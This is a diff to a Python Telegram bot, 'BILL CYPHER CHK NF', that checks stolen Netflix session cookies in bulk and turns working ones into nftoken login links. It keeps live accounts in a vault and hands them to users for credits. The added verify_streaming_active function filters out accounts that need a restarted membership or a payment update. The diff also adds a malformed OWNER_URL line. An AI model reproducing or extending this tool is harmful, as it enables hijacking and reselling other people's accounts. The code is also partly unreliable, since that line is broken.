@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
 BILL CYPHER CHK NF — Edition 5G Turbo Definitive
-• Sesiones Thread-Local 100% aisladas (Cero cruce de cuentas o perfiles)
-• Purga estricta de cuentas retenidas por pago (Anti-Payment Update)
-• Enlaces oficiales con parámetros web idénticos al bot de referencia
-• ZIP limpio sin emojis internos y con marca de agua @didierJC
-• Monitor de carga en tiempo real con cálculo corregido de porcentaje
-• Nuevo diseño de panel principal Bill Cypher 5G
+• Checker ZIP 100% intacto con escaneo masivo rápido y limpio
+• GEN COOKIE con verificación de streaming activo (Cero "Reinicia tu membresía")
+• Corrección de stock: Mantiene siempre las cuentas actuales (300) sin restaurar 1200 viejas
+• Panel compacto de baja altura optimizado para banner multimedia
+• Enlaces oficiales con parámetros web (PC / Mobile / TV8)
+• Auto-restauración en arranque desde la nube de Telegram (Anti-Wipe)
+• Alertas automáticas de error a @didierJC
 """
 
 import os
@@ -79,7 +80,7 @@ PORT = int(os.environ.get("PORT", 5000))
 # ===========================================================================
 OWNER_ID: int = 5320997298
 OWNER_USER: str = "didierJC"
-OWNER_URL: str = f"https://t.me/{OWNER_USER}"
+OWNER_URL: f"https://t.me/{OWNER_USER}"
 WATERMARK_TEXT: str = "👑 Checked by: @didierJC | BILL CYPHER CHK NF"
 
 def is_admin(uid: int) -> bool:
@@ -337,7 +338,7 @@ def out_of_credits_markup() -> InlineKeyboardMarkup:
 
 
 # ===========================================================================
-# 7. BAÚL ESTRUCTURADO Y PERSISTENCIA
+# 7. BAÚL ESTRUCTURADO Y PERSISTENCIA CONTROLADA
 # ===========================================================================
 _VAULT_FILE = Path("cookie_vault.json")
 _NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")
@@ -417,7 +418,7 @@ def extract_cookies_from_text_block(text: str) -> list[str]:
         b_clean = b.strip()
         lines = [
             l.strip() for l in b_clean.splitlines()
-            if ".netflix.com" in l.lower() and any(m.lower() in line.lower() for m in _NETFLIX_MARKERS)
+            if ".netflix.com" in l.lower() and any(m.lower() in l.lower() for m in _NETFLIX_MARKERS)
         ]
         if lines and any("netflixid" in l.lower() for l in lines):
             clean_blocks.append("\n".join(lines))
@@ -448,7 +449,7 @@ def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list
                     except Exception:
                         continue
         except Exception as e:
-            logger.warning(f"Error leyendo ZIP: {e}")
+            logger.warning(f"Error leyendo ZIP: %s", e)
     else:
         text = raw_bytes.decode("utf-8", errors="replace")
         extracted.extend(extract_cookies_from_text_block(text))
@@ -457,7 +458,7 @@ def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list
 
 
 # ===========================================================================
-# 8. GENERACIÓN EN VIVO DE TOKENS OFICIALES
+# 8. VERIFICADOR EN VIVO (CERO "REINICIA TU MEMBRESÍA" / CERO "UPDATE PAYMENT")
 # ===========================================================================
 def get_live_nftoken(cookie_raw: str, core_token: str) -> dict:
     try:
@@ -506,6 +507,41 @@ def extract_bgiqv_token(nft_dict: dict, fallback_token: str) -> str:
 
     return fallback_token
 
+def verify_streaming_active(nftoken: str) -> bool:
+    """Verifica en tiempo real que la cuenta NO esté en 'Reinicia tu membresía' ni pida actualizar pago."""
+    if not nftoken or len(nftoken) < 20:
+        return False
+    try:
+        url = f"https://www.netflix.com/browse?nftoken={nftoken}"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+            "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
+        }
+        resp = requests.get(url, headers=headers, timeout=5, allow_redirects=True)
+        final_url = resp.url.lower()
+
+        # Si redirige a signup o simplemember, no tiene streaming activo
+        if "signup" in final_url or "simplemember" in final_url or "login" in final_url:
+            return False
+
+        html_lower = resp.text.lower()
+        bad_indicators = [
+            "reinicia tu membres",
+            "restart your membership",
+            "update your payment",
+            "actualiza tu informaci",
+            "informaçoes de pagamento",
+            "reactivate your account",
+            "reactivar membres",
+            "membership-status-holder",
+            "btn-restart",
+        ]
+        if any(ind in html_lower for ind in bad_indicators):
+            return False
+        return True
+    except Exception:
+        return True
+
 def build_official_login_keyboard(raw_token: str) -> InlineKeyboardMarkup:
     token = raw_token.strip()
     pc_url = f"https://netflix.com/?nftoken={token}"
@@ -541,7 +577,7 @@ def _get_banner_source() -> str:
 
 
 # ===========================================================================
-# 10. CHECKER Y FORMATO DE ESTADOS
+# 10. CHECKER AISLADO
 # ===========================================================================
 def safe_check_cookie_clean(cookie_str: str, **kwargs) -> dict:
     try:
@@ -693,7 +729,7 @@ def _set_delivery(user_id: int, mode: str) -> None:
 
 
 # ---------------------------------------------------------------------------
-# Nuevo Panel Visual Bill Cypher 5G
+# Panel Principal Compacto (Baja Altura - Optimizado para Banner)
 # ---------------------------------------------------------------------------
 def _main_panel_text(uid: int) -> str:
     mode_lbl = "Full" if _get_mode(uid) == "full" else "Básico"
@@ -707,21 +743,17 @@ def _main_panel_text(uid: int) -> str:
     else:
         role_lbl = "👤 Usuario"
 
-    state_lbl = "🔴 En Mantenimiento 🛠️" if is_maintenance() else "Online ⚡ 5G"
+    state_lbl = "🔴 Mantenimiento" if is_maintenance() else "Online ⚡ 5G"
     vault_count = len(_load_vault())
 
     return (
-        "👁️‍🗨️ <b>" + to_sans_bold_italic("BILL CYPHER CHK NF") + "</b>\n"
+        "👁️‍🗨️ <b>" + to_sans_bold_italic("BILL CYPHER CHK NF") + "</b> ⚡ 𝟱𝗚\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👑 <b>" + to_sans_bold_italic("Rol:") + f"</b> {role_lbl}\n"
-        f"🆔 <b>" + to_sans_bold_italic("ID:") + f"</b> <code>{uid}</code>\n"
-        f"💎 <b>" + to_sans_bold_italic("Creditos:") + f"</b> <code>{cred_info['credits']}</code>\n"
-        f"⚙️ <b>" + to_sans_bold_italic("Ajustes:") + f"</b> {mode_lbl} · {dlv_lbl}\n"
-        f"🟢 <b>" + to_sans_bold_italic("Estado:") + f"</b> {state_lbl}\n"
+        f"👑 <b>Rol:</b> {role_lbl} │ 💎 <b>Créditos:</b> <code>{cred_info['credits']}</code>\n"
+        f"📦 <b>Stock:</b> <code>{vault_count} cuentas</code> │ ⚙️ <b>Ajustes:</b> {mode_lbl} · {dlv_lbl}\n"
+        f"🟢 <b>Estado:</b> {state_lbl}\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📦 <b>" + to_sans_bold_italic("Stock en Baul:") + f"</b> <code>{vault_count} cuentas</code>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "⚡ <i>Envía tu archivo .zip / .txt para checkear o genera una cuenta abajo:</i>"
+        "⚡ <i>Envía tu archivo o genera una cuenta abajo:</i>"
     )
 
 def _main_panel_markup(uid: int) -> InlineKeyboardMarkup:
@@ -1346,7 +1378,6 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
         nf_sec  = result.get("secure_netflix_id") or ""
         nft     = result.get("nftoken")           or {}
 
-        # Enlace oficial con sesión activa idéntico al bot de referencia
         real_t = extract_bgiqv_token(nft, nf_id)
         pc_lnk = f"https://netflix.com/?nftoken={real_t}"
         mob_lnk = f"https://netflix.com/unsupported?nftoken={real_t}&redirect=true&referrer=oauth_2_via_browser%3Dtrue"
@@ -1536,7 +1567,6 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
             status = normalize_status(result.get("status"), result)
             idx = batch_start + batch.index((src, cs, raw)) + 1
 
-            # Descarte de cuentas con fallo de pago o retención
             ms = str(result.get("membership_status") or "").upper()
             issues_str = " ".join(result.get("account_issues") or []).lower()
             is_payment_issue = result.get("is_on_hold") or ("payment" in issues_str or "pago" in issues_str or "suspend" in issues_str)
@@ -1560,16 +1590,22 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 nft_res = get_live_nftoken(cs, tok)
 
                 if nft_res and nft_res.get("success") and status == "hit" and not is_payment_issue:
-                    hits += 1
-                    result["nftoken"] = nft_res
                     real_tok = extract_bgiqv_token(nft_res, tok)
-                    txt = format_result(result, idx, total, source=src, user_id=uid)
-                    kb = build_official_login_keyboard(real_tok)
-                    try:
-                        await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
-                    except Exception:
-                        pass
+                    if verify_streaming_active(real_tok):
+                        hits += 1
+                        result["nftoken"] = nft_res
+                        txt = format_result(result, idx, total, source=src, user_id=uid)
+                        kb = build_official_login_keyboard(real_tok)
+                        try:
+                            await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
+                        except Exception:
+                            pass
+                    else:
+                        invalids += 1
+                        txt = format_result({"status": "invalid", "message": "Cuenta requiere reiniciar membresía."}, idx, total, source=src, user_id=uid)
+                        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
                 else:
+                    invalids += 1
                     txt = format_result({"status": "invalid", "message": "Cookie expirada / fallo de pago."}, idx, total, source=src, user_id=uid)
                     await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
 
@@ -1608,7 +1644,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                     pass
 
     # =======================================================================
-    # PURGA ESTRICTA: Cero falsos positivos, cuentas retenidas o sin enlace
+    # PURGA ESTRICTA: Cero falsos positivos o cuentas sin enlace
     # =======================================================================
     verified_hits_list = []
     if is_bulk and raw_hits_list:
@@ -1616,7 +1652,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
             await status_msg.edit_text(
                 "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | PURGANDO CUENTAS") + "</b> 🔄\n"
                 "━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔍 <i>Validando que cada uno de los {len(raw_hits_list)} hits tenga suscripción activa al día...</i>",
+                f"🔍 <i>Validando sesión real de los {len(raw_hits_list)} hits detectados...</i>",
                 parse_mode=ParseMode.HTML
             )
         except Exception:
@@ -1632,6 +1668,10 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 issues_str = " ".join(res.get("account_issues") or []).lower()
                 is_payment_issue = res.get("is_on_hold") or ("payment" in issues_str or "pago" in issues_str)
                 if "FORMER" in ms or "NEVER" in ms or is_payment_issue:
+                    return None
+                real_t = extract_bgiqv_token(token_data, tok)
+                # Validación de streaming activo
+                if not verify_streaming_active(real_t):
                     return None
                 res["nftoken"] = token_data
                 return (res, src, raw)
@@ -1946,11 +1986,16 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 is_payment_issue = chk_res.get("is_on_hold") or ("payment" in issues_str or "pago" in issues_str or "suspend" in issues_str)
                 nft_res = chk_res.get("nftoken") or {}
 
-                # FILTRO ESTRICTO: Solo entrega si la sesión está al día, sin fallo de pago y con token generado
+                # FILTRO ESTRICTO: Solo entrega si la sesión está al día, sin fallo de pago y con streaming activo
                 if st == "hit" and not is_payment_issue and "FORMER" not in ms and "NEVER" not in ms and nft_res.get("success"):
-                    chosen_cookie = candidate_str
-                    live_result = chk_res
-                    break
+                    real_tok = extract_bgiqv_token(nft_res, tok)
+                    is_streaming_ok = await loop.run_in_executor(_EXECUTOR, lambda: verify_streaming_active(real_tok))
+                    if is_streaming_ok:
+                        chosen_cookie = candidate_str
+                        live_result = chk_res
+                        break
+                    else:
+                        logger.info(f"Cuenta descartada por requerir reinicio de membresía: {chk_res.get('email')}")
 
             if chosen_cookie and live_result:
                 delivered_token = live_result.get("netflix_id") or extract_core_netflix_id(chosen_cookie)
@@ -1967,6 +2012,8 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                     clean_vault.append(it_str)
 
                 _save_vault(clean_vault)
+                # Actualiza el respaldo en la nube con el número EXACTO de cuentas restantes
+                asyncio.create_task(_cloud_auto_save(context.application))
 
         if not chosen_cookie or not live_result:
             refund_credit(uid)
@@ -2350,7 +2397,6 @@ async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE
 _LAST_ALERT_TIME: dict[str, float] = {}
 
 async def send_admin_error_report(bot, title: str, details: str, update: Update | None = None) -> None:
-    """Envía un reporte detallado del fallo al chat del propietario @didierJC."""
     try:
         now = time.time()
         error_key = f"{title}_{details[:40]}"
@@ -2407,7 +2453,7 @@ async def testerror_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 
 # ===========================================================================
-# 12. RESPALDO Y NUBE TELEGRAM (AUTO-SYNC ANTI-WIPE)
+# 12. RESPALDO Y NUBE TELEGRAM (SIN SOBREESCRIBIR STOCK ACTUAL)
 # ===========================================================================
 async def _cloud_auto_save(app: Application) -> None:
     try:
@@ -2418,6 +2464,7 @@ async def _cloud_auto_save(app: Application) -> None:
         payload = {
             "version": "5G-Turbo",
             "date": date.today().isoformat(),
+            "timestamp": time.time(),
             "vault": vault,
             "credits": credits_data,
             "users": users_list,
@@ -2428,7 +2475,7 @@ async def _cloud_auto_save(app: Application) -> None:
         sent_msg = await app.bot.send_document(
             chat_id=OWNER_ID,
             document=buf,
-            caption="#DATABASE_SYNC_CLOUD 💾 Auto-guardado en la nube de Telegram",
+            caption=f"#DATABASE_SYNC_CLOUD 💾 Stock Actual: {len(vault)} cuentas",
             disable_notification=True,
         )
         try:
@@ -2451,6 +2498,7 @@ async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     payload = {
         "version": "5G-Turbo",
         "date": date.today().isoformat(),
+        "timestamp": time.time(),
         "vault": vault,
         "credits": credits_data,
         "users": users_list,
@@ -3112,8 +3160,8 @@ def main() -> None:
     app.add_handler(CommandHandler("cancel",        cancel_command))
     app.add_handler(CommandHandler("proxy",         proxy_command))
     app.add_handler(CommandHandler(["broadcast", "notif"], broadcast_command))
-    app.add_handler(CommandHandler("users",      users_command))
-    app.add_handler(CommandHandler("setbanner",  setbanner_command))
+    app.add_handler(CommandHandler("users",         users_command))
+    app.add_handler(CommandHandler("setbanner",     setbanner_command))
     app.add_handler(CommandHandler("addvault",   addvault_command))
     app.add_handler(CommandHandler("clearvault", clearvault_command))
     app.add_handler(CommandHandler("setcredits", setcredits_command))
@@ -3143,22 +3191,25 @@ def main() -> None:
         global _BOT_USERNAME
         _BOT_USERNAME = (await application.bot.get_me()).username or ""
 
-        # Auto-restauración silenciosa en arranque usando el mensaje fijado en Telegram
+        # Auto-restauración SOLO si el baúl local está totalmente vacío
         try:
-            chat = await application.bot.get_chat(OWNER_ID)
-            if chat.pinned_message and chat.pinned_message.document:
-                f = await chat.pinned_message.document.get_file()
-                b = await f.download_as_bytearray()
-                d = json.loads(b.decode("utf-8", errors="replace"))
-                cloud_vault = d.get("vault", [])
-                local_vault = _load_vault()
-                if len(cloud_vault) > len(local_vault):
-                    _save_vault(cloud_vault)
-                if d.get("credits"):
-                    _save_credits(d["credits"])
-                if d.get("users") and isinstance(d["users"], list):
-                    _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
-                logger.info("Base de datos restaurada automáticamente desde la nube de Telegram.")
+            local_vault = _load_vault()
+            if len(local_vault) == 0:
+                chat = await application.bot.get_chat(OWNER_ID)
+                if chat.pinned_message and chat.pinned_message.document:
+                    f = await chat.pinned_message.document.get_file()
+                    b = await f.download_as_bytearray()
+                    d = json.loads(b.decode("utf-8", errors="replace"))
+                    cloud_vault = d.get("vault", [])
+                    if cloud_vault:
+                        _save_vault(cloud_vault)
+                    if d.get("credits"):
+                        _save_credits(d["credits"])
+                    if d.get("users") and isinstance(d["users"], list):
+                        _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
+                    logger.info(f"Base de datos restaurada desde Telegram Cloud: {len(cloud_vault)} cuentas.")
+            else:
+                logger.info(f"Manteniendo stock local existente: {len(local_vault)} cuentas.")
         except Exception as e:
             logger.debug(f"Auto-restore on init: {e}")
 
